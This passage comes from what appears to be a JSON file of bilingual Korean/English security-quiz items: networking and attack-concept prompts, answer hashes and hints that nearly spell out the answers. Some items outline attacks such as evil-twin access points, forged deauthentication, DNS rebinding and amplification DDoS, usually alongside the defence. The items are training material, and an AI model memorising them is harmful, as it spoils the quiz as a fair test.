        "여기에만 바인딩한 서비스는 다른 장비에서 접근할 수 없습니다."
      ],
      "en": [
        "A compound of 'loop' and the word for coming back.",
        "A service bound only to it cannot be reached from another machine."
      ]
    }
  },
  {
    "id": "t0_osi",
    "tier": 0,
    "cat": "network",
    "track": "network",
    "points": 60,
    "ci": true,
    "hash": "75e07ef9bcaa8fd530089f7d81a3da7eda54a1cae0ebf0dbc72d0657deea2ae7",
    "fmt": "약어 / acronym (3글자 / 3 chars)",
    "title": {
      "ko": "일곱 층",
      "en": "Seven Layers"
    },
    "prompt": {
      "ko": "물리·데이터링크·네트워크·전송·세션·표현·응용의 일곱 계층으로 나눈, 문제가 어느 계층에 있는지 말할 때 지금도 쓰는 참조 모델의 3글자 약자는?",
      "en": "What 3-letter acronym names the seven-layer reference model — physical, data link, network, transport, session, presentation, application — engineers still use to say which layer a problem lives on?"
    },
    "hints": {
      "ko": [
        "Open Systems Interconnection 의 머리글자입니다.",
        "일상적으로 말하는 L7·L3 가 이 모델의 계층 번호입니다."
      ],
      "en": [
        "Initials of Open Systems Interconnection.",
        "Everyday talk of 'L7' and 'L3' means this model's layers."
      ]
    }
  },
  {
    "id": "t1_arp",
    "tier": 1,
    "cat": "network",
    "track": "network",
    "points": 60,
    "ci": true,
    "hash": "cf835fc094349f22c2214fc8256cb895fcbcc01c77083c0f94114703d9e79a29",
    "fmt": "약어 / acronym (3글자 / 3 chars)",
    "title": {
      "ko": "그 IP는 누구 것?",
      "en": "Who Has That IP?"
    },
    "prompt": {
      "ko": "같은 LAN 안에서 IPv4 주소만 아는 장비가 프레임에 들어갈 하드웨어 주소를 알아내야 합니다. 세그먼트 전체에 '10.0.0.5 를 가진 쪽?' 하고 물은 뒤 응답을 캐시에 담아 두는 이 프로토콜의 3글자 약자는?",
      "en": "Inside one LAN segment a machine that knows only an IPv4 address still needs the hardware address that belongs in the frame. What 3-letter acronym names the protocol that asks the whole segment 'who has 10.0.0.5?' and caches the reply?"
    },
    "hints": {
      "ko": [
        "Address Resolution Protocol 의 머리글자입니다.",
        "`____ -a` 로 캐시 표를 볼 수 있습니다. 응답에 인증이 없어 위조가 쉽습니다."
      ],
      "en": [
        "Initials of Address Resolution Protocol.",
        "`____ -a` prints the cached table; the replies are unauthenticated, so they are easy to forge."
      ]
    }
  },
  {
    "id": "t1_icmp",
    "tier": 1,
    "cat": "network",
    "track": "network",
    "points": 60,
    "ci": true,
    "hash": "c3eac7105ca647900c32b5eced7a6ccb56cded0790ef0bc08614a5ad31e54025",
    "fmt": "약어 / acronym (4글자 / 4 chars)",
    "title": {
      "ko": "오류를 알려 주는 전령",
      "en": "The Messenger for Errors"
    },
    "prompt": {
      "ko": "사용자 데이터가 아니라 IP 자체의 제어·오류 메시지('목적지 도달 불가', '시간 초과', 에코 요청/응답)를 실어 나르는 프로토콜의 4글자 약자는?",
      "en": "Which 4-letter protocol acronym carries IP's own control and error messages — 'destination unreachable', 'time exceeded', the echo request/reply pair — rather than user data?"
    },
    "hints": {
      "ko": [
        "Internet Control Message Protocol 의 머리글자입니다.",
        "방화벽이 통째로 막아 두는 일이 많아, 조용한 장비가 곧 꺼진 장비는 아닙니다."
      ],
      "en": [
        "Initials of Internet Control Message Protocol.",
        "Firewalls often drop it wholesale, so a silent machine is not proof it is down."
      ]
    }
  },
  {
    "id": "t1_mx",
    "tier": 1,
    "cat": "network",
    "track": "network",
    "points": 65,
    "ci": true,
    "hash": "d7f890c4f72a3d49b69870b2dc2850c698e7b841eb2dd7cd21e4de551a29f4c4",
    "fmt": "약어 / acronym (2글자 / 2 chars)",
    "title": {
      "ko": "편지는 어디로",
      "en": "Where the Mail Goes"
    },
    "prompt": {
      "ko": "어떤 도메인의 메일을 어느 서버가 받는지 알려 주고, 여러 개일 때는 우선순위 숫자로 고르게 하는 DNS 레코드 종류의 2글자 약자는?",
      "en": "Which 2-letter DNS record type tells a sender which server accepts email for a domain, using a preference number to choose among several?"
    },
    "hints": {
      "ko": [
        "Mail eXchanger 의 줄임입니다.",
        "`dig example.com __` 로 조회합니다. 방치된 항목은 남의 서버로 메일을 넘길 수 있습니다."
      ],
      "en": [
        "Short for Mail eXchanger.",
        "`dig example.com __` lists them; a stale entry can hand mail to someone else."
      ]
    }
  },
  {
    "id": "t1_vlan",
    "tier": 1,
    "cat": "network",
    "track": "network",
    "points": 65,
    "ci": true,
    "hash": "c3b258168c41c0bce97616716bef315eeed33eb1142904bfe7f32eb392c7cf80",
    "fmt": "약어 / acronym (4글자 / 4 chars)",
    "title": {
      "ko": "한 스위치, 여러 네트워크",
      "en": "One Switch, Many Networks"
    },
    "prompt": {
      "ko": "물리 스위치 한 대가 12비트 ID(802.1Q)로 구분되는 여러 개의 독립된 도메인을 나르게 해 주는 논리적 분할의 4글자 약자는?",
      "en": "What 4-letter acronym names the logical segmentation that lets one physical switch carry several separate domains, each tagged with its own 12-bit id (802.1Q)?"
    },
    "hints": {
      "ko": [
        "Virtual Local Area Network 의 머리글자입니다.",
        "포트를 트렁크 자동 협상 상태로 두면 그 사이를 건너뛰는 공격이 가능합니다."
      ],
      "en": [
        "Initials of Virtual Local Area Network.",
        "Leaving a port negotiating trunk mode lets an attacker hop between them."
      ]
    }
  },
  {
    "id": "t1_traceroute",
    "tier": 1,
    "cat": "network",
    "track": "network",
    "points": 70,
    "ci": true,
    "hash": "261063ce089e84d540c499ef21de9486c2be4ee6c79142a2dca537262239e6a5",
    "fmt": "명령어 / command",
    "title": {
      "ko": "어디를 거쳐 가나",
      "en": "Which Way Did It Go"
    },
    "prompt": {
      "ko": "TTL 을 1, 2, 3 으로 늘려 가며 탐침을 보내고 돌아오는 '시간 초과' 응답을 읽어, 패킷이 거쳐 가는 라우터를 하나씩 밝혀내는 고전 명령은? (한 단어, 유닉스 표기)",
      "en": "Which classic command reveals every router a packet passes through by sending probes with a time-to-live of 1, then 2, then 3, and reading each 'time exceeded' reply? (one word, the Unix spelling)"
    },
    "hints": {
      "ko": [
        "'추적' 을 뜻하는 단어에 '경로' 를 뜻하는 단어를 붙였습니다.",
        "윈도우에서는 `tracert` 라고 씁니다. 여기서 묻는 것은 유닉스 쪽 이름입니다."
      ],
      "en": [
        "The word for tracing joined with the word for a route.",
        "Windows spells it `tracert`; this asks for the Unix name."
      ]
    }
  },
  {
    "id": "t1_nat",
    "tier": 1,
    "cat": "network",
    "track": "network",
    "points": 70,
    "ci": true,
    "hash": "d919a100ce6b45524d415d52d088d5817587c6dd8c3691b03b8063c44d043523",
    "fmt": "약어 / acronym (3글자 / 3 chars)",
    "title": {
      "ko": "하나의 공인 주소 뒤에",
      "en": "Behind One Public Address"
    },
    "prompt": {
      "ko": "사설 출발지 주소를 공인 주소 하나로 바꿔 쓰고(응답이 돌아올 수 있도록 포트를 기억하며), 가정 네트워크 전체가 IPv4 주소 하나를 나눠 쓰게 해 주는 라우터 기능의 3글자 약자는?",
      "en": "What 3-letter acronym names the router function that rewrites private source addresses into one public address — tracking ports so replies find their way back — letting a whole home network share a single IPv4 address?"
    },
    "hints": {
      "ko": [
        "Network Address Translation 의 머리글자입니다.",
        "그래서 이 뒤에 있는 장비는 포워딩 규칙 없이는 밖에서 먼저 접속할 수 없습니다."
      ],
      "en": [
        "Initials of Network Address Translation.",
        "It is why a machine behind it cannot be reached from outside without a forwarding rule."
      ]
    }
  },
  {
    "id": "t1_whois",
    "tier": 1,
    "cat": "network",
    "track": "network",
    "points": 65,
    "ci": true,
    "hash": "b1140742ba42ab97d3e8b01c0cbb29d4de2c347d735e20160f00468af5b2b021",
    "fmt": "명령어 / command",
    "title": {
      "ko": "이 도메인 주인은",
      "en": "Who Owns This Domain"
    },
    "prompt": {
      "ko": "정찰 단계에서 레지스트리에 질의해 도메인의 등록자·등록기관·네임서버·만료일을 가져오는 한 단어짜리 명령(그리고 그 뒤의 프로토콜)의 이름은?",
      "en": "In reconnaissance, which one-word command — and the protocol behind it — asks a registry for a domain's registrant, registrar, name servers and expiry date?"
    },
    "hints": {
      "ko": [
        "'who is' 라는 물음에서 빈칸을 뺀 형태입니다.",
        "요즘은 등록기관이 개인정보 보호를 이유로 상당 부분을 가려서 내보냅니다."
      ],
      "en": [
        "The question 'who is' with the space taken out.",
        "Registrars now redact much of the output for privacy."
      ]
    }
  },
  {
    "id": "t2_sni",
    "tier": 2,
    "cat": "network",
    "track": "network",
    "points": 80,
    "ci": true,
    "hash": "a97c5f2dd3d5023df257f9b37f1922f92a1aa1248b2eb082200c838724b51e2b",
    "fmt": "약어 / acronym (3글자 / 3 chars)",
    "title": {
      "ko": "암호화 전에 새어 나가는 이름",
      "en": "The Name That Leaks First"
    },
    "prompt": {
      "ko": "TLS 핸드셰이크에서 ClientHello 는 암호화가 시작되기 전에 요청 대상의 이름을 평문으로 실어 보냅니다. HTTPS 인데도 중간 장비가 어느 사이트에 접속하는지 알 수 있는 이유이죠. 이 확장의 3글자 약자는?",
      "en": "In a TLS handshake the ClientHello carries the requested name in the clear, before any encryption begins — which is how a middlebox can tell which site you are visiting even over HTTPS. What 3-letter acronym names that extension?"
    },
    "hints": {
      "ko": [
        "Server Name Indication 의 머리글자입니다.",
        "IP 하나가 여러 인증서를 서비스할 수 있는 것도 서버가 이 값을 이렇게 일찍 알기 때문입니다."
      ],
      "en": [
        "Initials of Server Name Indication.",
        "One IP can serve many certificates only because the server learns the name this early."
      ]
    }
  },
  {
    "id": "t2_ipsec",
    "tier": 2,
    "cat": "network",
    "track": "network",
    "points": 85,
    "ci": true,
    "hash": "be9f13bdf5f5b56126d09f0489cf3f8464ae4b68e8787a8b9e68f5fa73aa8202",
    "fmt": "한 단어 / one word",
    "title": {
      "ko": "IP 계층의 터널",
      "en": "A Tunnel at the IP Layer"
    },
    "prompt": {
      "ko": "AH·ESP 로 무결성과 암호화를, IKE 로 키 교환을 담당하며 네트워크 계층 자체에서 트래픽을 보호해 대부분의 사이트 간 VPN 의 바탕이 되는 프로토콜 모음의 이름은? (붙여서 한 덩어리로)",
      "en": "Which protocol suite secures traffic at the network layer itself — AH and ESP for integrity and encryption, IKE for key exchange — and underpins most site-to-site VPNs? (one token, no space)"
    },
    "hints": {
      "ko": [
        "'IP' 뒤에 'security' 의 앞 세 글자를 붙인 이름입니다.",
        "전송 모드는 페이로드만, 터널 모드는 원본 패킷 전체를 감쌉니다."
      ],
      "en": [
        "'IP' joined with the first three letters of 'security'.",
        "Transport mode protects the payload; tunnel mode wraps the entire original packet."
      ]
    }
  },
  {
    "id": "t2_eviltwin",
    "tier": 2,
    "cat": "network",
    "track": "network",
    "points": 85,
    "ci": true,
    "hash": "35a53abb01f049ed49f551625c5c1fc45f2381c7804aa0e13c239b1b60ceceb0",
    "fmt": "두 단어 / two words",
    "title": {
      "ko": "똑같은 이름의 가짜",
      "en": "The Fake With the Same Name"
    },
    "prompt": {
      "ko": "공격자가 진짜와 똑같은 네트워크 이름을 더 강한 신호로 내보내는 무선 AP 를 세워, 단말이 그쪽에 붙게 만들고 오가는 트래픽을 가로챕니다. 이 가짜 AP 를 부르는 영어 두 단어는?",
      "en": "An attacker stands up an access point announcing the same network name as the real one, with a stronger signal, so clients associate with it and hand over their traffic. What two-word English term names this rogue access point?"
    },
    "hints": {
      "ko": [
        "'사악한' 을 뜻하는 형용사와 '쌍둥이' 를 뜻하는 명사, 두 단어입니다.",
        "가짜 로그인 페이지까지 붙이면 비밀번호도 함께 수집됩니다."
      ],
      "en": [
        "Two words: a wicked adjective plus the noun for an identical sibling.",
        "Pair it with a fake login page and it collects the password too."
      ]
    }
  },
  {
    "id": "t2_deauth",
    "tier": 2,
    "cat": "network",
    "track": "network",
    "points": 90,
    "ci": true,
    "hash": "da26748823899561eb2a55fd5a9d867d39a9d00a942e15828438fcf9e8de3804",
    "fmt": "한 단어 / one word",
    "title": {
      "ko": "잠깐 끊어라",
      "en": "Knock Them Off"
    },
    "prompt": {
      "ko": "802.11 관리 프레임은 오랫동안 인증되지 않아, 단말에게 연결을 끊으라고 알리는 프레임을 누구나 위조할 수 있었습니다. 가짜 AP 로 유도할 때도, 재접속 순간의 핸드셰이크를 잡을 때도 쓰였죠. 이 프레임과 공격을 부르는 짧은 이름은? (한 단어, 줄인 형태)",
      "en": "802.11 management frames went unauthenticated for years, so anyone could forge the one telling a client to disconnect — used both to push a client onto a rogue AP and to capture the handshake on reconnect. What is the common short name for that frame and attack? (one word, the abbreviated form)"
    },
    "hints": {
      "ko": [
        "'되돌리다' 를 뜻하는 접두사 뒤에 'authentication' 의 줄임을 붙인 형태입니다.",
        "802.11w 의 보호된 관리 프레임이 이 문제의 해결책입니다."
      ],
      "en": [
        "The prefix meaning 'undo' in front of the shortened form of 'authentication'.",
        "802.11w (protected management frames) is the fix."
      ]
    }
  },
  {
    "id": "t2_wep",
    "tier": 2,
    "cat": "network",
    "track": "network",
    "points": 90,
    "ci": true,
    "hash": "e5b3d61431b57b959f330ed5c6a6285ed52a86b3da8205ca175e5198e014f3c1",
    "fmt": "약어 / acronym (3글자 / 3 chars)",
    "title": {
      "ko": "24비트짜리 실수",
      "en": "A 24-Bit Mistake"
    },
    "prompt": {
      "ko": "최초의 802.11 암호화 방식은 24비트 초기화 벡터와 RC4 를 썼는데, 이 값이 몇 시간이면 반복되어 수집한 트래픽만으로 몇 분 만에 키가 복구되었습니다. 이 방식의 3글자 약자는?",
      "en": "The original 802.11 encryption scheme paired RC4 with a 24-bit initialization vector that repeats within hours, letting the key be recovered from captured traffic in minutes. What is its 3-letter acronym?"
    },
    "hints": {
      "ko": [
        "Wired Equivalent Privacy 의 머리글자 — 이름이 약속한 것보다 훨씬 못했습니다.",
        "뒤이어 WPA, 그다음 WPA2 가 이것을 대체했습니다."
      ],
      "en": [
        "Initials of Wired Equivalent Privacy — a name that promised more than it delivered.",
        "WPA, and then WPA2, replaced it."
      ]
    }
  },
  {
    "id": "t2_snmp",
    "tier": 2,
    "cat": "network",
    "track": "network",
    "points": 100,
    "ci": true,
    "hash": "9e7f55c19ed75b9bb3bfcc7c65182fdeac0236803c4bf26ed437824b7338956a",
    "fmt": "약어 / acronym (4글자 / 4 chars)",
    "title": {
      "ko": "열려 있는 관리 통로",
      "en": "The Management Door Left Open"
    },
    "prompt": {
      "ko": "라우터·스위치·프린터는 UDP 기반 관리 프로토콜로 상태 값과 설정을 노출합니다. 버전 1 과 2c 는 공유 문자열 하나만으로 인증하는데, 수많은 장비가 그 값을 `public` 그대로 두고 있죠. 이 프로토콜의 4글자 약자는?",
      "en": "Routers, switches and printers expose their counters and settings over a UDP management protocol whose versions 1 and 2c authenticate with nothing but a shared string — left at `public` on countless devices. What is its 4-letter acronym?"
    },
    "hints": {
      "ko": [
        "Simple Network Management Protocol 의 머리글자입니다.",
        "버전 3 에 와서야 제대로 된 인증과 암호화가 붙었습니다."
      ],
      "en": [
        "Initials of Simple Network Management Protocol.",
        "Version 3 was the first to add real authentication and encryption."
      ]
    }
  },
  {
    "id": "t2_promiscuous",
    "tier": 2,
    "cat": "network",
    "track": "network",
    "points": 80,
    "ci": true,
    "hash": "85f5d2e0be9805a29999c2226a417e555c9c442870d4e745a522483db17f80d9",
    "fmt": "한 단어 / one word",
    "title": {
      "ko": "내 것이 아닌 프레임까지",
      "en": "Frames That Are Not Yours"
    },
    "prompt": {
      "ko": "네트워크 카드는 보통 자기 하드웨어 주소로 오지 않은 프레임을 버립니다. 세그먼트의 모든 것을 잡으려는 스니퍼는 카드를 어떤 모드로 바꿀까요? (영어 한 단어)",
      "en": "A network card normally discards frames not addressed to its own hardware address. To capture everything on the segment, a sniffer puts the card into which mode? (one English word)"
    },
    "hints": {
      "ko": [
        "'가리지 않는' 을 뜻하는 영어 형용사입니다.",
        "스위치 환경에서는 이것만으로 부족해 미러 포트나 탭이 함께 필요합니다."
      ],
      "en": [
        "The English adjective for 'indiscriminate'.",
        "On a switched network it is not enough by itself — you also need a mirror port or a tap."
      ]
    }
  },
  {
    "id": "t3_rebinding",
    "tier": 3,
    "cat": "network",
    "track": "network",
    "points": 105,
    "ci": true,
    "hash": "0807d29b7231e5549c90e5dfccbd5f545aecad98b7530890abf4e4a1a0280bb9",
    "fmt": "한 단어 / one word (-ing으로 끝남 / ends in -ing)",
    "title": {
      "ko": "같은 이름, 다른 주소",
      "en": "Same Name, New Address"
    },
    "prompt": {
      "ko": "공격자의 도메인이 처음에는 공인 주소로 응답해 페이지를 띄우고, 레코드 수명을 1초로 둔 채 다시 물으면 `192.168.0.1` 로 응답합니다. 이미 로드된 스크립트가 같은 출처 자격으로 피해자의 공유기와 통신할 수 있게 되죠. 이 공격을 'DNS ____' 이라 부릅니다. 빈칸의 영어 한 단어는?",
      "en": "An attacker's domain first answers with a public address so the page loads, then — with a one-second record lifetime — answers again with `192.168.0.1`, so the already-loaded script may talk to the victim's router under the same origin. This attack is called 'DNS ____'. What one English word fills the blank?"
    },
    "hints": {
      "ko": [
        "'다시 묶는다' 는 뜻의 동사에 -ing 를 붙인 형태입니다.",
        "해석된 주소를 고정하거나, 목적지에서 요청이 자칭하는 이름을 검증하면 막힙니다."
      ],
      "en": [
        "The '-ing' form of a verb meaning to bind again, to something else.",
        "Pinning the resolved address, or checking at the target which name the request claims, defeats it."
      ]
    }
  },
  {
    "id": "t3_amplification",
    "tier": 3,
    "cat": "network",
    "track": "network",
    "points": 110,
    "ci": true,
    "hash": "ccc52fa33c390d49c7971ec7a3cce9de2d5dc8a40a2d34532644f576dd3a5c42",
    "fmt": "한 단어 / one word",
    "title": {
      "ko": "작게 묻고 크게 받는다",
      "en": "Small Question, Huge Answer"
    },
    "prompt": {
      "ko": "공격자가 출발지 주소를 피해자로 위조해 개방 리졸버나 NTP 서버에 작은 UDP 질의를 보내면, 훨씬 큰 응답이 전부 피해자에게 쏟아집니다. 공격자가 쓴 대역폭의 수십 배가 되기도 하죠. 이 효과를 가리키는 영어 한 단어는? ('DNS ____ 공격' 의 그 단어)",
      "en": "A DDoS technique forges the victim's address as the source of small UDP queries to open resolvers or NTP servers, whose far larger replies all land on the victim — dozens of times the attacker's own bandwidth. What single English word names that multiplying effect (as in 'DNS ____ attack')?"
    },
    "hints": {
      "ko": [
        "소리나 크기를 키운다는 뜻의 명사입니다.",
        "응답 크기와 질의 크기의 비를 이것의 '계수' 라고 부릅니다."
      ],
      "en": [
        "The noun for making something louder or larger.",
        "The ratio of reply size to query size is called the factor of this."
      ]
    }
  },
  {
    "id": "t3_slowloris",
    "tier": 3,
    "cat": "network",
    "track": "network",
    "points": 115,
    "ci": true,
    "hash": "1f2aff657741018a68ef7540764440d4387176bdf4eb0ffd7d7798d8a3d674f2",
    "fmt": "한 단어 / one word",
    "title": {
      "ko": "느리게 목을 조른다",
      "en": "Slow Strangulation"
    },
    "prompt": {
      "ko": "이 서비스 거부 공격은 웹 서버에 연결을 잔뜩 열어 두고 몇 초에 한 번씩 헤더 한 줄만 흘려보내 연결을 간신히 살려 둡니다. 대역폭을 거의 쓰지 않고도 연결 풀이 고갈되죠. 느리게 움직이는 영장류의 이름을 딴 이 공격의 이름은? (한 단어)",
      "en": "This denial of service opens many connections to a web server and keeps each barely alive by dribbling out a single partial header every few seconds, exhausting the connection pool on almost no bandwidth. It is named after a slow-moving primate. What is it called? (one word)"
    },
    "hints": {
      "ko": [
        "'느린' 을 뜻하는 단어에, 눈이 큰 야행성 영장류의 이름을 붙였습니다.",
        "요청을 전부 받아 두었다가 넘기는 리버스 프록시를 앞에 두면 무력화됩니다."
      ],
      "en": [
        "'slow' joined with the name of a big-eyed nocturnal primate.",
        "A reverse proxy that buffers the whole request before forwarding defeats it."
      ]
    }
  },
  {
    "id": "t3_pivoting",
    "tier": 3,
    "cat": "network",
    "track": "network",
    "points": 120,
    "ci": true,
    "hash": "230bb2b52c70291db9127a0dea376a56a037af5057ed7ca08918985e2db2875d",
    "fmt": "한 단어 / one word (-ing으로 끝남 / ends in -ing)",
    "title": {
      "ko": "발판을 딛고 안쪽으로",
      "en": "Using the Foothold to Go Deeper"
    },
    "prompt": {
      "ko": "인터넷에 노출된 장비 한 대를 장악한 공격자가 그 장비를 통해 트래픽을 흘려보내, 외부에 열린 적 없는 내부 서브넷까지 닿습니다 — SSH 터널·포트 포워딩·SOCKS 프록시로요. 이렇게 네트워크 안쪽으로 옮겨 가는 행위를 가리키는 영어 한 단어(-ing 형)는?",
      "en": "Having taken one internet-facing machine, the attacker routes traffic through it to reach the internal subnet that was never exposed — with SSH tunnels, port forwards, a SOCKS proxy. What single English word, in its -ing form, names moving deeper into a network this way?"
    },
    "hints": {
      "ko": [
        "한 발을 축으로 삼아 도는 동작을 뜻하는 동사의 -ing 형입니다.",
        "네트워크 분할(세그멘테이션)은 바로 이 비용을 올리려고 존재합니다."
      ],
      "en": [
        "The -ing form of the verb for turning on a fixed point, the way a basketball player does.",
        "Network segmentation exists precisely to make this expensive."
      ]
    }
  },
  {
    "id": "t3_portknock",
    "tier": 3,
    "cat": "network",
    "track": "network",
    "points": 125,
    "ci": true,
    "hash": "d2e949a46902f80a82c919b99f035c9d0d29cada38b12ccac42d88d3c9aa0ebb",
    "fmt": "두 단어 / two words",
    "title": {
      "ko": "정해진 순서로 두드려라",
      "en": "Knock in the Right Order"
    },
    "prompt": {
      "ko": "서비스를 방화벽 뒤에 숨겨 두고, 클라이언트가 닫힌 포트들을 미리 약속한 순서대로 두드렸을 때만 해당 포트를 열어 주는 방식이 있습니다. 올바른 리듬으로 두드린 사람에게만 문이 열리는 셈이죠. 이 기법을 부르는 영어 두 단어는?",
      "en": "A service can hide behind a firewall that opens its port only after the client has attempted connections to a prearranged sequence of closed ports — the door opens only for whoever taps the right rhythm. What two-word English term names this technique?"
    },
    "hints": {
      "ko": [
        "두 번째 단어는 문 앞에서 하는 동작의 -ing 형입니다.",
        "인증이 아니라 은닉입니다 — 순서를 엿본 사람은 그대로 따라 할 수 있습니다."
      ],
      "en": [
        "The second word is the -ing form of what you do at a door.",
        "It is obscurity, not authentication — anyone who watches the sequence can replay it."
      ]
    }
  },
  {
    "id": "t3_ja3",
    "tier": 3,
    "cat": "network",
    "track": "network",
    "points": 130,
    "ci": true,
    "hash": "d823ade9182081d884b7e1b914e89bbdb03a8ea0e6a393a4596ad940c7b44bee",
    "fmt": "약어 / acronym (3글자 / 3 chars)",
    "title": {
      "ko": "손을 어떻게 흔드는가",
      "en": "How You Shake Hands"
    },
    "prompt": {
      "ko": "TLS 를 복호화하지 않고도, ClientHello 에 실린 암호 스위트·확장·곡선 목록을 순서 그대로 해시하면 클라이언트 라이브러리를 식별하는 지문이 나옵니다. HTTPS 위에서도 특정 악성코드 계열이 드러나죠. Salesforce 가 공개한 이 지문의 3글자 이름은?",
      "en": "Without decrypting TLS at all, a defender can hash the ordered list of cipher suites, extensions and curves in the ClientHello to get a fingerprint identifying the client library — so a malware family stands out even over HTTPS. What is the 3-character name of this fingerprint, published by Salesforce?"
    },
    "hints": {
      "ko": [
        "이니셜 두 글자 뒤에 숫자 3 이 붙습니다. 후속 규격은 같은 방식으로 4 가 붙습니다.",
        "서버 쪽에도 짝이 되는 지문이 있고, 이름 끝에 S 가 붙습니다."
      ],
      "en": [
        "Two initials followed by the digit 3; its successor is named the same way with a 4.",
        "Servers have a counterpart fingerprint whose name ends in an S."
      ]
    }
  },
  {
    "id": "t3_bgp",
    "tier": 3,
    "cat": "network",
    "track": "network",
    "points": 140,
    "ci": true,
    "hash": "5ed8c466a446c1f9802271d7393e807a8470b936cff34f05bc617cf4d5a7dd72",
    "fmt": "약어 / acronym (3글자 / 3 chars)",
    "title": {
      "ko": "인터넷은 신뢰로 굴러간다",
      "en": "The Internet Runs on Trust"
    },
    "prompt": {
      "ko": "자율 시스템(AS)들이 자기가 닿을 수 있는 주소 대역을 서로 알리는 이 프로토콜에는 소유권을 증명하는 장치가 없습니다. 그래서 남의 대역을 자기 것이라 광고하면 그 네트워크로 갈 트래픽을 끌어올 수 있죠. 이 라우팅 프로토콜의 3글자 약자는?",
      "en": "The protocol autonomous systems use to advertise which address blocks they can reach has no built-in proof of ownership — so an operator announcing a prefix it does not hold can pull another network's traffic to itself. What is this routing protocol's 3-letter acronym?"
    },
    "hints": {
      "ko": [
        "자율 시스템 사이에서 TCP 179 번 위로 동작합니다.",
        "2008년 유튜브 접속 장애와 여러 건의 암호화폐 거래소 탈취가 거짓 광고 하나에서 시작됐습니다."
      ],
      "en": [
        "It runs between autonomous systems over TCP port 179.",
        "The 2008 YouTube outage and several crypto-exchange thefts began with one false announcement here."
      ]
    }
  },
  {
    "id": "t4_quic",
    "tier": 4,
    "cat": "network",
    "track": "network",
    "points": 140,
    "ci": true,
    "hash": "387166e8d5e3d12859c7b18a34dae7f4337e6a8039347f8d5279e6f7f854c40d",
    "fmt": "한 단어 / one word",
    "title": {
      "ko": "UDP 위에 올라탄 전송",
      "en": "Transport on Top of UDP"
    },
    "prompt": {
      "ko": "HTTP/3 는 TCP 위에서 동작하지 않습니다. 이 전송 프로토콜은 UDP 위에서 스트림을 다중화하고 핸드셰이크와 암호화를 안에 품고 있어, 별도의 TLS 계층이 없고 패킷 하나를 잃어도 해당 스트림만 멈춥니다. 이 프로토콜의 이름은? (붙여서 한 덩어리로)",
      "en": "HTTP/3 does not run on TCP at all. Its transport multiplexes streams over UDP with the handshake and encryption built in, so there is no separate TLS layer and a lost packet stalls only its own stream. What is this transport protocol called? (one token)"
    },
    "hints": {
      "ko": [
        "네 글자입니다. 구글에서 처음엔 약자로 읽혔지만 지금은 그냥 프로토콜 이름입니다.",
        "UDP 위에 있으므로 TCP 만 이해하는 중간 장비는 내용을 들여다볼 수 없습니다."
      ],
      "en": [
        "Four letters; first read as an acronym at Google, now simply the protocol's name.",
        "Because it rides UDP, middleboxes that only understand TCP cannot inspect it."
      ]
    }
  },
  {
    "id": "t4_doh",
    "tier": 4,
    "cat": "network",
    "track": "network",
    "points": 150,
    "ci": true,
    "hash": "30ba046924427f14548567adbd8f9e36ca530c6d5b9b81ab1d767a1278e9491b",
    "fmt": "약어 / acronym (3글자 / 3 chars)",
    "title": {
      "ko": "질의까지 숨긴다",
      "en": "Hiding the Lookup Too"
    },
    "prompt": {
      "ko": "이름 해석은 원래 UDP 53 번을 평문으로 오갔기 때문에 경로상의 누구나 보고 바꿀 수 있었습니다. 이 질의를 리졸버로 향하는 평범한 HTTPS 요청 안에 감싸 넣는 방식의 3글자 약자는? — 기업 방화벽에서 웹 트래픽과 구분되지 않는다는 부작용도 함께 옵니다.",
      "en": "Name resolution used to travel in the clear over UDP 53, so anyone on the path could read and rewrite it. What 3-letter acronym names the scheme that wraps those queries inside an ordinary HTTPS request to a resolver — which also makes them indistinguishable from web traffic at the enterprise firewall?"
    },
    "hints": {
      "ko": [
        "프로토콜 이름, 'over', 그리고 보안 웹 프로토콜 — 각각의 첫 글자만 땄습니다.",
        "전용 포트를 그대로 쓰는 형제 규격도 있는데, 그쪽은 HTTPS 안에 숨지 않습니다."
      ],
      "en": [
        "The protocol's name, the word 'over', and the secure web protocol — first letters only.",
        "A sibling scheme keeps a dedicated port instead of hiding inside HTTPS."
      ]
    }
  },
  {
    "id": "t4_rpki",
    "tier": 4,
    "cat": "network",
    "track": "network",
    "points": 160,
    "ci": true,
    "hash": "9dd287895fae6b057f80e8e7a17d5f53f373f27aed24718b493cc63e45cd82f4",
    "fmt": "약어 / acronym (4글자 / 4 chars)",
    "title": {
      "ko": "이 대역이 정말 네 것인가",
      "en": "Prove the Prefix Is Yours"
    },
    "prompt": {
      "ko": "자기 것이 아닌 주소 대역을 광고하지 못하도록, 각 대역과 그것을 광고해도 되는 AS 를 묶은 서명 객체를 공개하고 라우터가 어긋나는 광고를 거부하게 합니다. 이 인증서 기반 구조의 4글자 약자는?",
      "en": "To stop a network from announcing address space it does not hold, operators publish signed objects binding each prefix to the autonomous system allowed to originate it, and routers reject announcements that contradict them. What 4-letter acronym names this certificate infrastructure?"
    },
    "hints": {
      "ko": [
        "Resource Public Key Infrastructure 의 머리글자입니다.",
        "서명된 객체 자체는 ROA 라고 부릅니다."
      ],
      "en": [
        "Initials of Resource Public Key Infrastructure.",
        "The signed object itself is called a ROA."
      ]
    }
  },
  {
    "id": "t4_ocsp",
    "tier": 4,
    "cat": "network",
    "track": "network",
    "points": 170,
    "ci": true,
    "hash": "b913067f07fd41354ac64402bf7b5b5d3b2862ed567dbf77eb52db9277db5be5",
    "fmt": "약어 / acronym (4글자 / 4 chars)",
    "title": {
      "ko": "이 인증서 아직 살아 있나",
      "en": "Is This Certificate Still Good"
    },
    "prompt": {
      "ko": "브라우저가 폐기 목록 전체를 내려받는 대신, 특정 인증서 하나가 폐기되었는지 발급 CA 에 실시간으로 물어볼 수 있습니다. 다만 서버가 그 응답을 대신 첨부(stapling)하지 않으면 CA 에게 접속 사이트를 알려 주는 셈이 되죠. 이 프로토콜의 4글자 약자는?",
      "en": "A browser can ask the issuing CA in real time whether one specific certificate has been revoked, instead of downloading an entire revocation list — at the cost of telling the CA which site you are visiting, unless the server staples the answer itself. What 4-letter acronym names this protocol?"
    },
    "hints": {
      "ko": [
        "Online Certificate Status Protocol 의 머리글자입니다.",
        "이것이 대체한 목록 기반 방식은 CRL 입니다."
      ],
      "en": [
        "Initials of Online Certificate Status Protocol.",
        "The list-based alternative it replaced is the CRL."
      ]
    }
  },
  {
    "id": "t4_krack",
    "tier": 4,
    "cat": "network",
    "track": "network",
    "points": 180,
    "ci": true,
    "hash": "f7c1cc0ee77f3053be6032dfaa32913d9af58a7f64b06e352d2d7f4df5c11699",
    "fmt": "한 단어 / one word",
    "title": {
      "ko": "핸드셰이크를 되감다",
      "en": "Rewinding the Handshake"
    },
    "prompt": {
